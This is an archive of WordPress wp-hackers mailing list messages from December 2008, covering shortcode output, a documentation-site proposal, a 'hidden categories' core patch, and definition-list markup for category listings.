$wp_rewrite->category_structure =
> str_replace('/images/','/',$wp_rewrite->front) . $wp_rewrite->category_base
> . '/%category%';
>

The '/images/' part is stored in $wp_rewrite->front, so I can exclude it
from the rest of the permalink structures.

Thanks Mike!

That's why I said to inspect the URL and do it optionally.

Glad that worked and that I could help. :)

I don't see how that's possible (other than a plugin), but this isn't really
a support questions list. Please post here: http://wordpress.org/support/

Just thought that we can try to bring this idea to life ourselves.
Personally I'd be glad to participate in a project like that.

We can even host it separately for some time, until it gets a place in
WordPress world. It is possible to find a way to parse a phpdoc part
of documentation, but Codex one will be a little more cumbersome,
unless someone will let us to fetch it in raw format through some
simple API. Maybe there is one already or maybe it is already
integrated into wiki and we just need someone to tell us about that?

Subject: [wp-hackers] Problems with shortcode function in plugin
Message-ID: <9dd057850812290811w79fa28c0x7ebb444e654e4a1@mail.gmail.com>

Hi all,

I am upgrading a plugin of mine to have a shortcode for those users who
don't like editing their template files.

So, I added the add_shortcode hook to my plugin file, and call the main
plugin function within this hook. This works fine in that I can add the
shortcode when writing posts and the plugin's output appears within the
post. My problem is that the position of the shortcode within the post
content (whether, in Edit Post, I insert it at the beginning, middle or end
of the post) is completely ignored and the plugin output always appears at
the beginning of the post content. I'm using the_content to display the post
content in my test setup.

Clearly I am misunderstanding something basic about the shortcode API, so if
anyone can point me in the right direction it will be much appreciated.

Thanks!

Ade.

imho this is a total waste of energy to even consider. Each feed
cached in the options table is about as big as 1 or two posts from
your blog.

The above process might satisfy purists who don't want anything
unnecessary in their databases, but I think all normal people should
worry more about the effects of revisions or plugin-derived postmeta
(goddamn you, podpress!) on their database size instead.

Aaron,

Thanks for the hint!

Yes, I'm using echo - hence the problem (I've just re-read the Shortcode API
info on the Codex and found the reference to this).

All I've got to do now is work out how to deal with output which is
currently echoed during a foreach loop...

Thanks again.

Ade.

You can do something like this:

function whatever($echo=false) {
    $output = '';
    foreach(){
        $output .= "something";
    }
    if ($echo)
        echo $output;
    return $output;
}

Well the Codex runs off MediaWiki, which has an API:

Would love to see a sample of the code once you get it working.

This is more of a PHP question, but given what I assume are negative
performance implications of string concatenation in a loop for a large
number of items, I've always used the following since I've come to PHP:

function whatever($echo=false) {
    $output = array();
    foreach(){
        $output[] = "something";
    }
    $output = implode('',$output);
    if ($echo)
        echo $output;
    return $output;
}

Anyone else has thoughts on this?

http://codex.wordpress.org/Shortcode_API

"When the_content is displayed, the shortcode API will parse any registered
shortcodes such as "[my-shortcode]", separate and parse the attributes and
content, if any, and pass them the corresponding shorcode handler function.
Any string returned by the shortcode handler will be inserted into the post
body in place of the shortcode itself. "

so no echo just retrieve a string !

Mike,

Thanks for the extra info. I'm now adapting this to fit my scenario and will
post back once I've got it working.

Thank you Alex.

So, it is possible to create fully automated documentation site, which
will populate itself from phpdoc, Codex and user-made comments. Does
anyone here want to participate in a project like that? Gaarai, Brian?

I think we gotta choose php.net structure: function categories on top,
function listing from current directory on left sidebar, the in the
content part - function's phpdoc reference, source code block, codex
wiki underneath it and user comments at the bottom. All content block
should be collapsable. That's it I think.

Please feel free to express your opinions and suggestions, even if you
do not want or have no time to participate in the project.

Dave

php.net works not just because of the documentation and examples but
because of the added comments by users alongside each entry. So far I
haven't seen this suggested.

I'm very interested Dave. I like the idea mentioned before where we can 
test this out on a separate site, so that we can ensure that the method 
works. When we come up with a model that works, we can then do a 
proposal to the Docs team.

I have a very full day today, but I can begin work on stuff tomorrow 
evening.

I'm really interested in this, and I'm so glad there are others who are
willing to take time aside to make something better!
I'm a front-end developer/designer and I'm currently learning PHP, and the
Codex has been great for helping me get into both PHP and WordPress
Plugin/Theme development.

I would love to help out in any way possible - HTML/CSS/JS - and simple PHP
:P

I've also got plenty of room on my Dreamhost webhosting, with some spare
domains, so if you need a place to try things out I can donate that to the
cause :)

Chris, Dave, Alex -

Charles Clarkson has already written a parser in Perl that automates the 
creation of Codex documentation based on the inline documentation 
already in WordPress 2.7 (see 
http://comox.textdrive.com/pipermail/wp-docs/2008-December/001811.html). 
Why not work with him to improve the documentation, rather than 
duplicating his effort?

I would also recommend moving this discussion over to the wp-docs list 
(http://lists.automattic.com/mailman/listinfo/wp-docs) as it's the more 
appropriate place for it, and ensures that anyone already involved in 
the documentation process sees your thoughts/ideas on the subject.

Just my 3 cents worth.

Kim

Thanks Kim. I do want to move this over to Docs, and I've already 
contacted Charles. I'm just trying to drum up enough interest to get 
some more developers to come over there with me.

Subject: [wp-hackers] [PATCH] New feature: 'Hidden' categories
Message-ID: <20081230144024.GA19891@awacs.dhs.org>

Greetings,

Thanks for WordPress. I've been using it for a few weeks now and
love working with it.

I have created a patch for WordPress 2.7 which adds the ability to
create "hidden" categories and would like to invite your comments and
criticisms on both idea and implementation. I have not done any 
research on prior or similar work so please forgive me if I have
overlooked anything.

PURPOSE
=======

I often want posts to be easily accessible, but not advertised in
public. Sometimes I just want to be able to create a post and send the
direct link to my mother. WordPress has functionality to allow posts
to be 'Private' or 'Protected', but both of these require the viewer
to supply credentials. This is more than I want to subject my mother
to. 

I want to stress this is not a method to protect or secure posts. It
is instead a way to organize posts so that they don't clutter up the
main 'flow' and aren't exposed to casual viewers.

IMPLEMENTATION
==============

I have attached a patch implementing this functionality. The patch is
against WordPress 2.7.  

The patch modifies the database schema to add a 'flags' column to the
wp_terms table. The flags column is a comma separated list of string
values. Only the 'hidden' flag is defined. (this could be done more
efficiently using the MySQL enum type but I did not want to assume a
specific database)

The Walker_Category class was modified to test for the hidden flag and
not output anything if it exists.

The admin UI was modified to add a checkbox that allows setting the
hidden flag when creating or editing a category.

The following line of code needs to be added to The Loop of themes:

                <?php while (have_posts()) : the_post(); ?>
		<?php     if ( is_hidden_category() ) continue; ?>

This line of code was also added to the feed-rss2.php.

I welcome your comments and insights.

Have a fine 2009! 

Pascal.

This doesn't sound like a feature that most people would require and so 
would not go into the core of WordPress.

WordPress has a comprehensive plugin system to allow you to configure it 
to provide the functionality you require.

I suspect you may find someone has already written a plugin which 
achieves what you want.

If not it shouldn't be hard to create one.

Cheers

Pascal,

I'll through out my own plugin http://wordpress.org/extend/plugins/simply-exclude/ 
  which does basically what you are attempting to do but via the  
plugin architecture. In short the plugin allows for hiding categories  
from the front page, RSS, Search and Archive. This same logic applied  
to tags and authors. One thing not currently supported is control over  
the wp-list-categories output.

Thanks, I'll check it out. Do I understand correctly that it does not
affect the category list in the sidebar? Does it modify the previous
and next post links when viewing a single post?

This doesn't even require a plugin though. Simply filter out the categories
you don't want when you list them.

Hi Peter

Thanks for that suggestion. I have looked at the plugin system but did
not see how it could be used to hide previous/next post links or to
hide categories from the category listing in the sidebar.

For anyone interested, the patch is up at my blog with installation
instructions:

This is the same issue that I have been battling with constantly.  
Using wp_list_categories and excluding a category is great... as long  
as you're not using widgets. We had to custom code a categories widget  
that would exclude certain categories.

I'm also interested in learning more about this, and for a similar  
purpose, though I want to be able to manage a collection of MP3s like  
an album (instead of a collection of images as a gallery). Is it  
better to build my own uploader but use the API for the rest? There's  
not a lot in the codex about this:

I don't understand why it writes a ul list to start with.
It should be a data list:
<dl>
<dt>link to cat level1</dt>
<dd><dl>
<dt>link to cat level2</dt>
<dd><span>link to post level2</span>
<span>link to post level2</span>
<dl>
<dt>link to cat level3</dt>
<dd><span>link to post level3</span>
<span>link to post level3</span>
</dd>
</dl>
</dd>
</dl>
<span>link to post level1</span>
</dd>
</dl>
Makes css and javascript control much more practical. IMHO.

I think default behaviour should be as-is, without definitions. But I quite
like the ability to have a list of categories with a description for
each. Perhaps an argument which could change the output pattern? Setting
'style' to something different which would output your data list instead?

Hah, so I was right! I was just reading the HTML5 spec for <dl> and was sure
it said 'definition list'! :P

The unordered list output (ul) is correct for most sites and should not be
changed. Definition lists are used when something actually has pairs of
definitions or related terms. For most sites, the unordered list is the
right one to use. Some sites that have a very specialised focus may be
better using a definition list for categories.
To replace the unordered lists for those sites I have just edited
category-templates.php but maybe this could be added to pluggable.php so
users could easily override the function and change the unordered list to a
definition list (or even an ordered list) easily?

FYI, this is what I ended up with that worked really well for my needs:

<dl class="categories">
 <dt class="category-54">Top #2</dt>
 <dd class="category-54">
  <ul>
   <li class="parent category-54"><a href="/category/top-2/">Top #2</a>
(537)</li>
   <li class="children category-54">
    <ul>
     <li class="child category-90"><a href="/category/top-2/one/">One</a>
(290)</li>
     <li class="child category-70"><a href="/category/top-2/two/">Two</a>
(202)</li>
     <li class="child category-89"><a
href="/category/top-2/three/">Three</a> (29)</li>
    </ul>
   </li>
  </ul>
 </dd>
 <dt class="category-54">Top #2</dt>
 <dd class="category-54">
  <ul>
   <li class="parent category-54"><a href="/category/top-2/">Top #2</a>
(537)</li>
   <li class="children category-54">
    <ul>
     <li class="child category-90"><a href="/category/top-2/one/">One</a>
(290)</li>
     <li class="child category-70"><a href="/category/top-2/two/">Two</a>
(202)</li>
     <li class="child category-89"><a
href="/category/top-2/three/">Three</a> (29)</li>
    </ul>
   </li>
  </ul>
 </dd>
</dl>

The DT is used for a collapsed list that, when clicked, opens to a
heirarchical list of links that include that top level category as well as
its subcategories.

And not withstanding Lynne's comments I'd argue that while not a textual
"definition" this usage of having the definition be the associated
subcategories reasonably meets the intention for DD.  Looking at the HTML5
draft (http://www.whatwg.org/specs/web-apps/current-work/#the-dd-element)
which in the case of DD attempts to describe DD in ways that the HTML4 spec
didn't, DD is described as:

*The dd <http://www.whatwg.org/specs/web-apps/current-work/#the-dd-element>element
represents the description, definition, or value, part of a
term-description group in a description list
(dl<http://www.whatwg.org/specs/web-apps/current-work/#the-dl-element>element)
*

 So in this case the subcategories are the "*value*" for the top level
category. FWIW.

I'm probably missing something but couldn't you solve that problem instead
with an *add_filter('get_terms',...)*?

Hi Pascal,

Just FYI, this mailing list does not accept attachments, so none of us
got the patch.

I can see that your post to the list contains the paper clip icon
suggesting you attached the patch on the original e-mail, but the
attachment was scrubbed when the mailing list processed it.

Probably a good idea to <http://wordpress.pastebin.com/> it instead
(select the 'Forever' option).

Cheers,
Jeremy.

I stand corrected.
definition, data, data, definition.;-)
And here all this time I thought I was playing with data...
I wasn't suggesting a change from ul,
I know that would be almost impossible.
Glad you found a decent solution Mike.

I'm presently trying to write  a full dl multilevel for categories in  
php.
Not a phper, I'm having a heck of a time.
I'm kind of stuck loopin back for the 3rd , 4th, levels etc.

Anyone happen to have a script kickin about that could do that,,,

Your doing this recursively right? ( http://en.wikipedia.org/wiki/Recursion
 )
trying to do it with nested loops or something just isn't going to work.

Just being pedantic, but it *is* possible to do with nested loops in PHP
using arrays to simulate the stack. It's just nowhere near as elegant as
recursion. :-)

Your right. I stand corrected :)

For a "non phper" recursion is probably the best bet though.

I'm not trying to be contrary for contrary sake, really I'm not, but I
remember many 1st year computer science types that struggled with recursion.
It can really be hard to get one's head around, especially for
non-programmers.

That said, if Daiv Mowbray will post an example similar to the example I
posted of what he wants his markup to look like down to, say, the 4th level
I'll write the recursive login for him. Just not tonight as I'm leaving for
an NYE party soon. :-)
